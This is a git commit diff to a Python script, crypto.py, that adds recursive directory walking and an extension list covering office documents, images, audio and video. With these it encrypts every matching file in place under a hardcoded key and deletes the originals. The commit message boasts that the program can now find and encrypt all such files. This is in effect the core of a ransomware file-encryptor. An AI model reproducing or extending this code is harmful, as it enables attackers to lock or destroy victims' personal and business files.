60d964e62787d8a89a8957ed4c873c73f46baf07
Masaki <masaki0320@me.com>
2017-03-01 22:41:08 +0200

    Now program can find all the files by extension, and encrypt them all

--- crypto.py
+++ crypto.py
@@ -1,8 +1,31 @@
 import os, random
+import glob
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 
-def encrypt(key, filename):
+EXTENSIONS = {
+    "OFFICE": [
+        ".txt", ".csv", ".doc", ".docx", ".docm", ".dotm", ".dot", ".wbk", ".xls",
+        ".xlt", ".xlm", ".xlsx", ".xltx", "xltm", ".ppt", ".pot", ".pps", ".pptx",
+        ".pptm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm"
+    ],
+    "IMAGE":[
+        ".gif", ".pdf", ".png", ".jpg", ".jpeg", ".ani", ".bmp", ".cal", ".img", ".mac",
+        ".jbm", ".WMF"
+    ],
+    "AUDIO":[".mp3",".wav", ".aiff", ".aac", ".ogg", ".wma", ".flac", ".alac"],
+    "VIDEO":[".avi", ".asf", ".mov", ".avchd", ".vlc", ".mpg", ".mp4", ".wmv"]
+}
+OFFICE = EXTENSIONS.get("OFFICE")
+IMAGE = EXTENSIONS.get("IMAGE")
+AUDIO = EXTENSIONS.get("AUDIO")
+VIDEO = EXTENSIONS.get("VIDEO")
+
+KEYWORD = "password"
+
+def encrypt(key, path, filename):
+    os.chdir(path)
+
     chunksize = 64*1024
     outputFile = "(encryted)"+filename
     filesize = str(os.path.getsize(filename)).zfill(16)
@@ -26,8 +49,11 @@ def encrypt(key, filename):
                     chunk += ' ' * (16 - (len(chunk) % 16))
                     os.remove(filename)
                     outfile.write(encryptor.encrypt(chunk))
+                    print "[+] "+"\""+filename+"\""+" has been encrypted"
 
-def decrypt(key, filename):
+def decrypt(key, path, filename):
+    os.chdir(path)
+
     chunksize = 64*1024
     outputFile = filename[10:]
 
@@ -47,33 +73,73 @@ def decrypt(key, filename):
                     os.remove(filename)
                     outfile.write(decryptor.decrypt(chunk))
                     outfile.truncate(filesize)
+                    print "[+] "+"\""+filename+"\""+" has been decrypted"
+
 
 def get_key(password):
     hasher = SHA256.new(password)
     return hasher.digest()
 
+def encrypt_all(key, directory):
+
+    result = []
+    sub_directories = [x[0] for x in os.walk(directory)]
+
+    for sub_directory in sub_directories:
+        files = os.walk(sub_directory).next()[2]
+        if (len(files) > 0):
+            for file in files:
+                for extension in IMAGE:
+                    if file.endswith(extension):
+                        path = sub_directory + "/"
+                        result.append(path + file)
+                        encrypt(get_key(key), path, file)
+                    else:
+                        pass
+
+def decrypt_all(key, directory):
+    result = []
+    sub_directories = [x[0] for x in os.walk(directory)]
+
+    for sub_directory in sub_directories:
+        files = os.walk(sub_directory).next()[2]
+        if (len(files) > 0):
+            for file in files:
+                for extension in IMAGE:
+                    if file.endswith(extension):
+                        path = sub_directory + "/"
+                        result.append(path + file)
+                        decrypt(get_key(key), path, file)
+                    else:
+                        pass
+
 
 def Main():
-    choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt?: ")
+    # test()
 
-    if choice == 'E' or choice == 'e':
-        filename = raw_input("File to encrypt: ")
-        password = raw_input("Password: ")
-        try:
-            encrypt(get_key(password), filename)
-            print "... File encrypted"
-        except:
-            print "... Input file does not exist"
-    elif choice == 'D' or choice == 'e':
-        try:
-            filename = raw_input("File to decrypt: ")
-            password = raw_input("Password: ")
-            decrypt(get_key(password), filename)
-            print "... File decrypted"
-        except:
-            print "... Input file does not exist"
-    else:
-        print "No option selected, closing..."
+    choice = raw_input("Enter a directory: ")
+    encrypt_all(KEYWORD, choice)
+
+    # choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt?: ")
+    #
+    # if choice == 'E' or choice == 'e':
+    #     filename = raw_input("File to encrypt: ")
+    #     password = raw_input("Password: ")
+    #     try:
+    #         encrypt(get_key(password), filename)
+    #         print "... File encrypted"
+    #     except:
+    #         print "... Input file does not exist"
+    # elif choice == 'D' or choice == 'e':
+    #     try:
+    #         filename = raw_input("File to decrypt: ")
+    #         password = raw_input("Password: ")
+    #         decrypt(get_key(password), filename)
+    #         print "... File decrypted"
+    #     except:
+    #         print "... Input file does not exist"
+    # else:
+    #     print "No option selected, closing..."
 
 if __name__ == '__main__':
     Main()
